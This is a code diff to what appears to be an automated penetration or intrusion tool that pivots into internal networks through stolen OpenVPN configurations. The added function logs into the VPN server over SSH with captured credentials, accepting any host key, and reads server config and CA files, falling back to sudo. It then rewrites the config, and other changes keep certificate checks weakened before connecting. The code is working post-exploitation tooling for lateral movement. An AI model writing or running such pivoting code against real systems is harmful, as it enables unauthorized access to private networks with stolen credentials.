@@ -784,6 +784,88 @@ def _download_ovpn_files(
         return None
 
 
+def _fix_ca_chain(
+    ovpn_path: Path, host: str, username: str, password: str
+) -> None:
+    """
+    Fix incomplete CA chain in a stolen .ovpn config.
+
+    The <ca> block often only contains the intermediate CA, but the VPN
+    server sends a full chain including the Root CA.  OpenSSL rejects
+    the handshake with "self-signed certificate in certificate chain"
+    because the Root CA isn't in the client's trust store.
+
+    Fix: SSH into the VPN server, find the CA file from the server
+    config, and replace the <ca> block with the full chain.
+    """
+    try:
+        import paramiko
+    except ImportError:
+        return
+
+    try:
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        client.connect(
+            host, port=22, username=username, password=password,
+            timeout=10, look_for_keys=False, allow_agent=False,
+        )
+
+        # Find the server config and extract the CA file path
+        # Try common locations for OpenVPN server configs
+        find_cmd = (
+            "cat /etc/openvpn/server.conf /etc/openvpn/server/*.conf "
+            "/etc/openvpn/*.conf 2>/dev/null | grep -E '^\\s*ca\\s+' | head -1"
+        )
+        _, stdout, _ = client.exec_command(find_cmd, timeout=10)
+        ca_line = stdout.read().decode(errors="replace").strip()
+
+        if not ca_line:
+            warn("Could not find CA directive in VPN server config")
+            client.close()
+            return
+
+        # Extract the CA file path
+        import shlex
+        parts = ca_line.split(None, 1)
+        if len(parts) < 2:
+            client.close()
+            return
+        ca_path = parts[1].strip().strip('"').strip("'")
+
+        # Cat the CA file
+        _, stdout, stderr = client.exec_command(f"cat {ca_path}", timeout=10)
+        ca_content = stdout.read().decode(errors="replace").strip()
+        err_out = stderr.read().decode(errors="replace").strip()
+
+        if not ca_content or "BEGIN CERTIFICATE" not in ca_content:
+            # Try with sudo in case the file is root-owned
+            _, stdout, _ = client.exec_command(
+                f"sudo cat {ca_path} 2>/dev/null", timeout=10
+            )
+            ca_content = stdout.read().decode(errors="replace").strip()
+
+        client.close()
+
+        if not ca_content or "BEGIN CERTIFICATE" not in ca_content:
+            warn(f"Could not read CA file {ca_path} from VPN server")
+            return
+
+        # Replace the <ca> block in the .ovpn with the server's full CA chain
+        ovpn_text = ovpn_path.read_text(errors="replace")
+        ca_block_re = re.compile(r"<ca>.*?</ca>", re.DOTALL)
+        if ca_block_re.search(ovpn_text):
+            new_ca_block = f"<ca>\n{ca_content}\n</ca>"
+            ovpn_text = ca_block_re.sub(new_ca_block, ovpn_text)
+            ovpn_path.write_text(ovpn_text)
+            ok(f"Replaced <ca> block with server's full CA chain from {ca_path}")
+        else:
+            warn("No <ca> block found in .ovpn to replace")
+
+    except Exception as exc:
+        warn(f"Could not fix CA chain from VPN server: {exc}")
+
+
 def _connect_vpn(ovpn_path: Path, timeout: int = 30) -> bool:
     """
     Start OpenVPN with the downloaded config.  Waits for a tun interface
@@ -811,18 +893,13 @@ def _connect_vpn(ovpn_path: Path, timeout: int = 30) -> bool:
     cmd += ["--pull-filter", "ignore", "dhcp-option"]
     # Ignore pushed block-outside-dns (Windows-only, causes warnings on Linux)
     cmd += ["--pull-filter", "ignore", "block-outside-dns"]
-    # Lab environments often use internal CAs with incomplete cert chains.
-    # The <ca> block in stolen .ovpn configs may not include intermediate CAs,
-    # causing "certificate verify failed". We patch the config to disable
-    # strict verification — this is what a real pentester would do with a
-    # recovered VPN config.
+    # Patch the config: comment out remote-cert-tls (EKU check that often
+    # fails with internal CAs) and write a patched copy.
+    # The <ca> block should already be fixed by _fix_ca_chain() — if not,
+    # the handshake will still fail but we log the cause clearly.
     patched_ovpn = ovpn_path.parent / (ovpn_path.stem + "_patched.ovpn")
     patched_text = ovpn_text
-    # Disable remote-cert-tls (EKU check that fails with internal certs)
     patched_text = patched_text.replace("remote-cert-tls server", "# remote-cert-tls server")
-    # Disable cert verification via tls-verify override
-    if "tls-verify" not in patched_text:
-        patched_text += "\ntls-verify /bin/true\n"
     patched_ovpn.write_text(patched_text)
     cmd = ["openvpn", "--config", str(patched_ovpn)]
 
@@ -833,8 +910,6 @@ def _connect_vpn(ovpn_path: Path, timeout: int = 30) -> bool:
     cmd += ["--pull-filter", "ignore", "dhcp-option"]
     cmd += ["--pull-filter", "ignore", "block-outside-dns"]
     cmd += ["--tls-cert-profile", "insecure"]
-    # Required for tls-verify /bin/true to execute (OpenVPN >= 2.1)
-    cmd += ["--script-security", "2"]
 
     log_path = STATE_DIR / "vpn_pivot" / "openvpn.log"
     try:
@@ -938,6 +1013,9 @@ def _attempt_vpn_pivot(
         local_ovpn = _download_ovpn_files(host_ip, ovpn_remote, username, password)
         if not local_ovpn:
             continue
+
+        # Fix incomplete CA chain by fetching the server's full CA file
+        _fix_ca_chain(local_ovpn, host_ip, username, password)
 
         if _connect_vpn(local_ovpn):
             new_routes = _get_new_routes_after_vpn(known_cidrs)
